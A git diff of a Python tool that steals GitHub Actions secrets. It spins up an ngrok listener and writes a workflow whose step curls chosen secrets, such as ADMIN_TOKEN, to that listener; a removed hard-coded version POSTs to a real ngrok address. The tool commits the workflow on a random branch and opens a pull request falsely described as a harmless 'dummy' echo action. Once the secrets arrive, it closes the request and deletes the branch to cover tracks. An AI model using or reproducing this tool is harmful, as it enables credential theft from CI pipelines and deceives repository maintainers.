@@ -111,124 +111,6 @@ def print_color(text, color):
     print(fmt_color(text, color))
 
 
-class HelloHandler(BaseHTTPRequestHandler):
-    def do_GET(self):
-        body = bytes("Hello", "utf-8")
-        self.protocol_version = "HTTP/1.1"
-        self.send_response(200)
-        self.send_header("Content-Length", len(body))
-        self.end_headers()
-        self.wfile.write(body)
-
-
-yaml_content = """
-name: Dummy Action
-
-on: [push]
-
-jobs:
-build:
-    runs-on: ubuntu-latest
-    environment: production
-    steps:
-    - name: Run dummy command
-    run: |
-        echo running
-        curl -X POST -d '{"env.ADMIN_TOKEN": "${{ env.ADMIN_TOKEN }}", "secrets.AWS_ACCESS_KEY_ID": "${{ secrets.ADMIN_TOKEN}}" }' https://31e9-31-154-163-162.ngrok-free.app
-"""
-
-
-def local_repo(localpath):
-    # Initialize the repository
-    repo = Repo(localpath)
-    assert not repo.bare
-    # print git repo owner and name
-    # Get the URL of the 'origin' remote
-    origin_url = repo.remotes.origin.url
-
-    # Extract owner and repo name from the URL
-    pattern = r'github\.com[:/](.*?)/(.*?)(?:\.git)?$'
-    match = re.search(pattern, origin_url)
-
-    if match:
-        owner = match.group(1)
-        repo_name = match.group(2)
-        print(fmt_color(f"Repository: ", GREEN) +
-              fmt_color(f"{owner}/{repo_name}", CYAN))
-        return (repo, owner, repo_name)
-    else:
-        print_color(
-            "Could not parse owner and repository name from the URL", RED)
-        return None
-
-
-def dump_action_yaml(action_file_path, yaml_content):
-    os.makedirs(os.path.dirname(action_file_path), exist_ok=True)
-    with open(action_file_path, "w") as f:
-        f.write(yaml_content)
-
-
-def create(args):
-
-    port = get_port()
-    ngrok_listener = start_ngrok(port=str(port))
-    
-    content = render_action(environment=args.env, runs_on="ubuntu-latest",
-                            url=ngrok_listener.url, keys=args.val)
-    # should be in another thread
-    thread = threading.Thread(target=wait_for_response, args=(port))
-      # Start the thread
-    thread.start()
-    
-    print(f"Repo path: {args.path}")
-    repo, owner, repo_name = local_repo(args.path)
-
-    # Create and checkout the new branch
-    random_suffix = ''.join(random.choices(
-        string.ascii_lowercase + string.digits, k=8))
-    branch_name = "prefix-" + random_suffix
-    new_branch = repo.create_head(branch_name)
-    new_branch.checkout()
-    print(fmt_color(f"Branch created: ", GREEN) +
-          fmt_color(f"{branch_name}", CYAN))
-
-    # dump YAML content into action file
-    action_file_path = os.path.join(
-        args.path, ".github", "workflows", "dummy_action.yml")
-    dump_action_yaml(args.path, yaml_content=yaml_content)
-    print(fmt_color(f"Action file created: ", GREEN) +
-          fmt_color(f"{action_file_path}", CYAN))
-
-    # Stage and commit the changes
-    repo.index.add([action_file_path])
-    repo.index.commit("Add dummy GitHub action")
-
-    # Create a pull request
-    g = Github(args.gh_token)
-    github_repo = g.get_repo(owner + "/" + repo_name)
-    pr = github_repo.create_pull(
-        title="Add dummy GitHub action",
-        body="This PR adds a dummy GitHub action that echoes 'dummy'.",
-        head=branch_name,
-        base="main"  # or the default branch of your repo
-    )
-
-    print(fmt_color(f"Pull request created: ", GREEN) +
-          fmt_color(f"{pr.html_url}", CYAN))
-    
-    thread.join()
-
-    # close the pull request
-    pr.edit(state="closed")
-    print(fmt_color(f"Pull request closed: ", GREEN) +
-          fmt_color(f"{pr.html_url}", CYAN))
-    
-    # delete the branch
-    repo.delete_head(branch_name)
-    print(fmt_color(f"Branch deleted: ", GREEN) +
-          fmt_color(f"{branch_name}", CYAN))
-    
-
 class RequestHandler(BaseHTTPRequestHandler):
     def do_GET(self):
         if self.path == '/':
@@ -288,6 +170,97 @@ def wait_for_response(port):
         return False
 
 
+def local_repo(localpath):
+    # Initialize the repository
+    repo = Repo(localpath)
+    assert not repo.bare
+    # print git repo owner and name
+    # Get the URL of the 'origin' remote
+    origin_url = repo.remotes.origin.url
+
+    # Extract owner and repo name from the URL
+    pattern = r'github\.com[:/](.*?)/(.*?)(?:\.git)?$'
+    match = re.search(pattern, origin_url)
+
+    if match:
+        owner = match.group(1)
+        repo_name = match.group(2)
+        print(fmt_color(f"Repository: ", GREEN) +
+              fmt_color(f"{owner}/{repo_name}", CYAN))
+        return (repo, owner, repo_name)
+    else:
+        print_color(
+            "Could not parse owner and repository name from the URL", RED)
+        return None
+
+
+def dump_action_yaml(action_file_path, yaml_content):
+    os.makedirs(os.path.dirname(action_file_path), exist_ok=True)
+    with open(action_file_path, "w") as f:
+        f.write(yaml_content)
+
+
+def create(args):
+
+    port = get_port()
+    ngrok_listener = start_ngrok(port=str(port))
+
+    content = render_action(environment=args.env, runs_on="ubuntu-latest",
+                            url=ngrok_listener.url, keys=args.val)
+    # should be in another thread
+    thread = threading.Thread(target=wait_for_response, args=(port))
+    # Start the thread
+    thread.start()
+
+    print(f"Repo path: {args.path}")
+    repo, owner, repo_name = local_repo(args.path)
+
+    # Create and checkout the new branch
+    random_suffix = ''.join(random.choices(
+        string.ascii_lowercase + string.digits, k=8))
+    branch_name = "prefix-" + random_suffix
+    new_branch = repo.create_head(branch_name)
+    new_branch.checkout()
+    print(fmt_color(f"Branch created: ", GREEN) +
+          fmt_color(f"{branch_name}", CYAN))
+
+    # dump YAML content into action file
+    action_file_path = os.path.join(
+        args.path, ".github", "workflows", "dummy_action.yml")
+    dump_action_yaml(args.path, yaml_content=content)
+    print(fmt_color(f"Action file created: ", GREEN) +
+          fmt_color(f"{action_file_path}", CYAN))
+
+    # Stage and commit the changes
+    repo.index.add([action_file_path])
+    repo.index.commit("Add dummy GitHub action")
+
+    # Create a pull request
+    g = Github(args.gh_token)
+    github_repo = g.get_repo(owner + "/" + repo_name)
+    pr = github_repo.create_pull(
+        title="Add dummy GitHub action",
+        body="This PR adds a dummy GitHub action that echoes 'dummy'.",
+        head=branch_name,
+        base="main"  # or the default branch of your repo
+    )
+
+    print(fmt_color(f"Pull request created: ", GREEN) +
+          fmt_color(f"{pr.html_url}", CYAN))
+
+    thread.join()
+
+    # close the pull request
+    pr.edit(state="closed")
+    print(fmt_color(f"Pull request closed: ", GREEN) +
+          fmt_color(f"{pr.html_url}", CYAN))
+
+    # delete the branch
+    repo.delete_head(branch_name)
+    print(fmt_color(f"Branch deleted: ", GREEN) +
+          fmt_color(f"{branch_name}", CYAN))
+
+
 def main():
     parser = argparse.ArgumentParser(
         description='Fetch Info from Github repository environment variables')
@@ -299,8 +272,10 @@ def main():
     create_parser.add_argument(
         '--gh-token', '-t', type=str, help='Github API Token', default=None)
     # add argument for list of environment variables
-    create_parser.add_argument('-v','--val', action='append' ,help='.secrets / .env values to fetch', required=True)
-    create_parser.add_argument('-e','--env', type=str ,help='Github Environment to set in action file', default=None)
+    create_parser.add_argument('-v', '--val', action='append',
+                               help='.secrets / .env values to fetch', required=True)
+    create_parser.add_argument(
+        '-e', '--env', type=str, help='Github Environment to set in action file', default=None)
 
     create_parser.set_defaults(func=create)
 
